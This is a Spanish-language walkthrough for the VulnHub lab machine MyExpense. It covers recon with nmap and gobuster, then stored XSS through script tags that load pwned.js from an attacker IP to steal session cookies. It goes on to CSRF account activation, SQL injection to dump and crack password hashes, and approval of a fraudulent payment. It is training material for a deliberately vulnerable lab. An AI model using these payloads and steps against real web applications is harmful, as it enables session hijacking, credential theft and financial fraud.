---

---
-----
- Tags : #vulnhub #maquinas #script #csrf #sqlinyection 
- -----

- **Máquina MyExpense**: [https://www.vulnhub.com/entry/myexpense-1,405/](https://www.vulnhub.com/entry/myexpense-1,405/)

**Importante:** Esta maquina en particular es vulnerable a XSS sin embargo cuando la iniciemos, esta maquina esta pensada para virtual box si deseamos iniciarla en vmware deberemos realizar lo siguiente:

En el arranque presionar **"e"** para entrar en la "bios" 
Con las flechas bajar todo y cambiar el parametro que termina en **"ro quiet"** y *reemplazarlo* por **"rw init=/bin/bash"**
- El objetivo de esto es que ahora al reiniciar presionando **"Ctrl + X"** , nos entregara una bash y es allí donde podremos movernos entre directorios para configurar la interfaz de red.

![Pasted image 20230904221906](../Fotos/Pasted%20image%2020230904221906.png)

![Pasted image 20230904221923](../Fotos/Pasted%20image%2020230904221923.png)

-  Ahora **Ctrl + X** 
![Pasted image 20230904221949](../Fotos/Pasted%20image%2020230904221949.png)

-  Una vez obtenida la bash vamos a **"cd etc/network"** y abrimos el archivo **"interfaces"** mediante nano.

![Pasted image 20230904222056](../Fotos/Pasted%20image%2020230904222056.png)

- Dentro de este archivo interfaces veremos el nombre de la verdadera interfaz que viene configurada por defecto para la maquina a pesar que al hacer un ip a nos manda la correspondiente al caso que toca ens33. 

![Pasted image 20230904222207](../Fotos/Pasted%20image%2020230904222207.png)

- Donde dice enp0s3 lo cambiaremos por "ens33" nuestra interfaz, echo esto **"Ctrl + o  , Enter , Ctrl + x"** y reiniciamos la maquina y ahora de nuestra maquina principal osea la atacante hagamos un escaneo de host con arp-scan veremos la maquina.

![Pasted image 20230904222344](../Fotos/Pasted%20image%2020230904222344.png)

Iniciaremos nuevamente la maquina presionaremos **"e"** para entrar en la bios y nuevamente abrirnos una bash, iremos a **"cd /opt/"** y abriremos con nano el archivo **"login_admin_script.py"** , será allí donde veremos nuevamente la interfaz de red que no corresponde con la nuestra osea en este caso la enp0s3 y en vez de poner la ens33 borraremos gran parte de la linea y pondremos directamente la ip de la maquina victima que es lo que en realidad se requiere en este parametro al final. 

![Pasted image 20230904223346](../Fotos/Pasted%20image%2020230904223346.png)

- **Borramos todo luego de "http://"**

![Pasted image 20230904223447](../Fotos/Pasted%20image%2020230904223447.png)

![Pasted image 20230904223842](../Fotos/Pasted%20image%2020230904223842.png)

- Echo esto seguimos con el siguiente archivo ya que en **/opt/** hay 4 archivos  y **repetiremos el proceso con los 4**

---------
# Fase de reconocimiento

**ping -c 1 IP VICTIMA :** En base al ttl sabremos el tipo de OS 64 para Linux 128 para Windows
o
**whichSystem.py IP VICTIMA :** Mediante script en python nos automatiza y nos dice directamente el OS solo funciona para windows o linux. Recomendado que este dentro del PATH.

# Escaneo de puertos  

nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.198 -oG allPorts

- *Podemos usar script extractPorts para poder copiar mas rápido los puertos* 
# Enumeracion

nmap -sCV -p80,34449,48135,56921,58575 192.168.1.108 -oN targeted
- -oN : permite enviar la data en formato tal cual como te la muestra en la terminal en nmap al archivo que deseemos en este caso al llamado targeted.

*80/tcp    open  http    Apache httpd 2.4.25 ((Debian))**
- Podemos buscar en la web Apache httpd 2.4.25 ((Debian)) launchpad y nos mostrara mas detalle del nombre de la versión si es un debian strech etc.

# USO DE FUZZING 

Objetivo encontrar directorios de archivos mediante **gobuster**

gobuster dir -u http://192.168.1.108/signup.php -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 2-
-  **dir** para indicar que usaremos un diccionario para fuerza bruta , **u** de url, **w** de write texto, **t** hilos 

![Pasted image 20230906230239](../Fotos/Pasted%20image%2020230906230239.png)

-  Probamos

![Pasted image 20230906230313](../Fotos/Pasted%20image%2020230906230313.png)

- Indica después que no tenemos permisos y utilizando **wappalyzer** visualizamos que tiene archivos en lenguaje php en la clase ya que a mi no me sale pero en si vamos a buscar archivos en el directorio admin que sean php

gobuster dir -u http://192.168.1.108/admin -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php 
- **-x php** buscaremos archivos php en el directorio */admin*.

![Pasted image 20230906230950](../Fotos/Pasted%20image%2020230906230950.png)

- Nos descubre un archivo admin.php 
- Buscaremos en la web el archivo /admin/admin.php (directorio/archivo)

![Pasted image 20230906231117](../Fotos/Pasted%20image%2020230906231117.png)

-  Podemos ver el usuario de samual que es slamotte y tenemos la clave que la brinda el vulnhub

![Pasted image 20230906231434](../Fotos/Pasted%20image%2020230906231434.png)

- Cuenta lockeada o inactiva.

Procederemos a crear una cuenta rellenando datos X pero nos daremos cuenta que no podremos registrar la cuenta en primera instancia

![Pasted image 20230907203001](../Fotos/Pasted%20image%2020230907203001.png)

- Es puro HTML por ende ahremos Ctrl + Shift + C 

![Pasted image 20230907203047](../Fotos/Pasted%20image%2020230907203047.png)

Si pinchamos en "Sign up" tendremos una linea en la consola que dice disabled, simplemente lo borramos

![Pasted image 20230907203232](../Fotos/Pasted%20image%2020230907203232.png)

- Quedaria de la siguiente manera y daremos Enter

![Pasted image 20230907203315](../Fotos/Pasted%20image%2020230907203315.png)

- Ahora nos permite crear la cuenta

![Pasted image 20230907203343](../Fotos/Pasted%20image%2020230907203343.png)

- Si revisamos nuevamente /admin/admin.php veremos el nuevo usuario inactivo

![Pasted image 20230907203433](../Fotos/Pasted%20image%2020230907203433.png)

- Repetiremos los pasos anteriores, crearemos un usuario nuevo activaremos la opcion de crear la cuenta con HTML y en el username y password intentaremos colar una alerta que dice XSS.

![Pasted image 20230907203750](../Fotos/Pasted%20image%2020230907203750.png)

- Ahora si volvemos a /admin/admin.php nos saldrá la alerta, este alerta solo se vera reflejada en esta dirección 

![Pasted image 20230907203915](../Fotos/Pasted%20image%2020230907203915.png)

- La idea es plantear la posibilidad de que algun usuario autenticado se encuentre revisando algunas veces del día esta pagina /admin/admin.php con la intención de alguna manera robarle la coockie de sesión.

```bash
<script src="http://192.168.1.107/pwned.js"></script>
```

- Repetimos el proceso pero nos ponemos en *escucha por el puerto 80 mediante servidor http montado en python* he intentaremos cargar un archivo pwned.js indicando nuestra ip atacante.

![Pasted image 20230907211036](../Fotos/Pasted%20image%2020230907211036.png)

- Esperaremos un tiempo y efectivamente veremos que hay una persona con permisos entrando a /admin/admin.php y lo vemos reflejado en la consola estando en escucha
**IMPORTANTE: TODO ESTO LO HACEMOS DENTRO DEL DIRECTORIO DONDE ESTA EL ARCHIVO PWNED.JS DE LO CONTRARIO NO LO ENCONTRARA PARA CARGARLO.**

![Pasted image 20230907211350](../Fotos/Pasted%20image%2020230907211350.png)

- Intenta intentando cargar el archivo.

*Sabiendo esto:* Intentaremos que el usuario cuando revise , como ya sabemos que si podemos cargar el archivo js, que el objetivo de este archivo sea enviarnos la coockie de sesion de la persona que esta revisando este portal especifico.
- Archivo pwned.js

![Pasted image 20230907214454](../Fotos/Pasted%20image%2020230907214454.png)

- *Como el usuario con la solicitud quedo ingresado, cuando la persona con acceso a este portal especifico entre, se ejecutara la solicitud y como estaremos en escucha por el puerto en el que opera la conexion a la web osea el puerto 80 por TCP, podremos obtener la cookie de sesión*

![Pasted image 20230907214701](../Fotos/Pasted%20image%2020230907214701.png)

PHPSESSID=dh204sidvc3kbbl666jl46b127
- Lo importante es dh204sidvc3kbbl666jl46b127

- Iremos a la consola de la web , pincharemos en *Storage* y en *Value* pegaremos la cookie de sesion.

![Pasted image 20230907215154](../Fotos/Pasted%20image%2020230907215154.png)

- Echo esto no nos permitirá acceder a la cuenta  pero es porque la cuenta es de un administrado y una cuenta admin no puede en este caso abrirse 2 veces. Esto nos lo notificara en /admin/admin.php

![Pasted image 20230907215400](../Fotos/Pasted%20image%2020230907215400.png)

# Para este punto usaremos Vulnerabilidad CSRF (Cross Site Request Forgery)

CSRF : Para este ejercicio en concreto nos ayudara para poder hacer que si el administrador que entra en la web reiteradamente pincha por alguna razón en un link que le mandemos automáticamente nos active la cuenta. 

- Al link que nos referimos es este: http://192.168.1.108/admin/admin.php?id=11&status=active , que es el que nos aparece al dar click en innactive en el /admin/admin.php 

![Pasted image 20230907220458](../Fotos/Pasted%20image%2020230907220458.png)

- Modificaremos el pwned.js ya que vimos que con la cookie no podríamos acceder, colocamos la url y nos volvemos a poner en escucha por el puerto 80 con python http server

![Pasted image 20230907221407](../Fotos/Pasted%20image%2020230907221407.png)

**IMPORTANTE: TODO ESTO LO HACEMOS DENTRO DEL DIRECTORIO DONDE ESTA EL ARCHIVO PWNED.JS DE LO CONTRARIO NO LO ENCONTRARA PARA CARGARLO.**
- Esperaremos a que se genere la solicitud tras el ingreso del admin a este portal y nos activara la cuenta.

![Pasted image 20230907221238](../Fotos/Pasted%20image%2020230907221238.png)

- Activada

![Pasted image 20230907221301](../Fotos/Pasted%20image%2020230907221301.png)

- Login

![Pasted image 20230907221538](../Fotos/Pasted%20image%2020230907221538.png)

![Pasted image 20230907221600](../Fotos/Pasted%20image%2020230907221600.png)

- Entraremos en Expense reports y haremos submitt como para poder aceptar el envio del dinero en relacion al tema de la maquina que es un cobro no generado y pendiente.

![Pasted image 20230907221759](../Fotos/Pasted%20image%2020230907221759.png)

- El pago quedo en status submitted pero no esta aceptado aun, alguien lo debe de aceptar.
- Si vamos  nuestro perfil veremos que tenemos como manager a una persona.

![Pasted image 20230907221925](../Fotos/Pasted%20image%2020230907221925.png)

- Iremos a /admin/admin.php para ver su usuario

![Pasted image 20230907222041](../Fotos/Pasted%20image%2020230907222041.png)

- Ademas podemos ver en el mismo panel /admin/admin.php que hay usuarios con rango Financial approver

![Pasted image 20230907222326](../Fotos/Pasted%20image%2020230907222326.png)

- **Pensamos que nosotros enviamos la solicitud, el manager la tiene que enviar a la entidad financiera y ella la aprueba.**
- Intentaremos robar una cookie, montamos nuevamente el servidor http server python puerto 4646

![Pasted image 20230907223504](../Fotos/Pasted%20image%2020230907223504.png)

- En Home bajamos y vamos ala partado de post a new message y ponemos
```bash
<script src="http://192.168.1.107:4646/pwned.js"></script>
```
- Especificando el puerto 

![Pasted image 20230907223311](../Fotos/Pasted%20image%2020230907223311.png)

- Echo esto veremos que en la ventana donde estamos en escucha se nos desplegaran muchas cookies de sesión

![Pasted image 20230907223708](../Fotos/Pasted%20image%2020230907223708.png)

-  Teniendo las cookies vamos probando a ver que usuario son los que tenemos y principalmente si alguno tiene el rango de manager y luego de financer accepter

![Pasted image 20230907223906](../Fotos/Pasted%20image%2020230907223906.png)

- Entramos a la sesion de nuestro manager y validamos la solicitud.
- El manager de manon riviera es  paul baudoin que justo es financer accepter donde finalmente tenemos que llegar y aceptar el pago.

![Pasted image 20230907224107](../Fotos/Pasted%20image%2020230907224107.png)

- El perfil Paul Baudouin no se encuentra en los post parece que no suele concurrirlo por lo que no tenemos la cookie de sesión.
- En la sesión de Manon Riviere, en la sección de Rennes, podemos ver que es vulnereable a SQLI 

![Pasted image 20230907224411](../Fotos/Pasted%20image%2020230907224411.png)

# SQLI

- Agregamos 1 comilla 

![Pasted image 20230908154646](../Fotos/Pasted%20image%2020230908154646.png)

- Probamos con order by (valor)-- - y comentamos(-- -) veremos si podemos deducir la cantidad de columnas tambien vimos que quitando comilla ya no nos arroja error.

![Pasted image 20230908154844](../Fotos/Pasted%20image%2020230908154844.png)

---

![Pasted image 20230908154914](../Fotos/Pasted%20image%2020230908154914.png)

----

![Pasted image 20230908155020](../Fotos/Pasted%20image%2020230908155020.png)

- Aplicamos schema para ver la base de datos

![Pasted image 20230908155220](../Fotos/Pasted%20image%2020230908155220.png)

- Aplicamos tables 

![Pasted image 20230908155353](../Fotos/Pasted%20image%2020230908155353.png)

- Aplicamos para continuar especificando 

![Pasted image 20230908155556](../Fotos/Pasted%20image%2020230908155556.png)

- Hay varias base de datos como vimos anteriormente por ello queremos saber cual esta en uso de la siguiente manera validamos y si no nos entrega informacion es que se contempla otra base de datos en uso y habría que especificar myexpense que es donde esta la data que buscamos.

![Pasted image 20230908155917](../Fotos/Pasted%20image%2020230908155917.png)

- Copiamos toda la linea de users y passwords y hacemos un archivo con nvim y decimos:
**:%s/,/\r/g** :  (:%s : Sustitución) Deseo hacer una sustitución donde haya una **,** que se reemplace por un **retorno o enter que es lo mismo** y **/g** para que lo aplique en todo el archivo y no solo en el primer match.

![Pasted image 20230908160129](../Fotos/Pasted%20image%2020230908160129.png)

- Son puras passwords Hasheadas *(Nos interesa el de pbaudouin Financer Accepter)**
- Tomamos el Hash de pbaudouin y utilizamos la web o la consola para pasarlo a legible , en este caso usaremos la web **Hashes.com**

![Pasted image 20230908160717](../Fotos/Pasted%20image%2020230908160717.png)

- **HackMe**
- Ya tendriamos el usuario y la contraseña, nos logeaermos

![Pasted image 20230908161406](../Fotos/Pasted%20image%2020230908161406.png)

- Finalmente mandamos el pago de 750 euros

![Pasted image 20230908162317](../Fotos/Pasted%20image%2020230908162317.png)

- *Nos logeamos en la cuenta del sujeto slamotte y vemos que el pago fue enviado y nos aparece que logramos tomar la flag**

![Pasted image 20230908162721](../Fotos/Pasted%20image%2020230908162721.png)

 - Si hacemos abrimos la consola del navegador vemos un valor numérico y también donde salen los usuarios sabemos que estos tienen un estado activo o inactivo

 ![Pasted image 20230908163130](../Fotos/Pasted%20image%2020230908163130.png)

 - Si quisiéramos ahora deshabilitar todas las cuentas podemos hacer lo siguiente en el pwned.js / el pwned.js ya lo teniamos cargado por ende al hacer est bucle muchas veces tomamos el valor del usuario 12 13 14 8 9 el que sea y le cambiamos el estado a inactive.

![Pasted image 20230908162940](../Fotos/Pasted%20image%2020230908162940.png)

- Nos ponemos en escucha por el puerto 80 

![Pasted image 20230908163251](../Fotos/Pasted%20image%2020230908163251.png)

- Echo esto se desabilitaran todas las cuentas menos la del administrador en este caso.

![Pasted image 20230908163334](../Fotos/Pasted%20image%2020230908163334.png)




